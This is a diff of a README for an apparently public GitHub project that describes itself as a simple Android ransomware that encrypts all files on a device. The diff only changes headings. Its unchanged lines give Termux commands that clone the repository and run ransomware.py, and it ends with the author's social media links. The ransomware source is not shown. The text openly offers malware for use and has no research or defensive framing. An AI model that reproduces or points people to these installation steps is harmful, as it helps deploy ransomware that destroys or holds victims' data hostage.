@@ -1,7 +1,7 @@
 # darkwaves
 this is a simple android ransomware, it will encrypted all the files in your android device 😈
 
-# how to install on Termux:
+### how to install on Termux:
 
     git clone https://github.com/Shadow8021/darkwaves.git
 
@@ -13,7 +13,7 @@ this is a simple android ransomware, it will encrypted all the files in your and
 
     python3 ransomware.py
 
-# author 
+### author 
 Instagram [@gregoroyaga](https://www.instagram.com/gregoroyaga?igsh=eGphaGp1dHJxdWs0)
 
 Facebook [@gregoroyaga](https://www.facebook.com/gregor.oyaga.3)
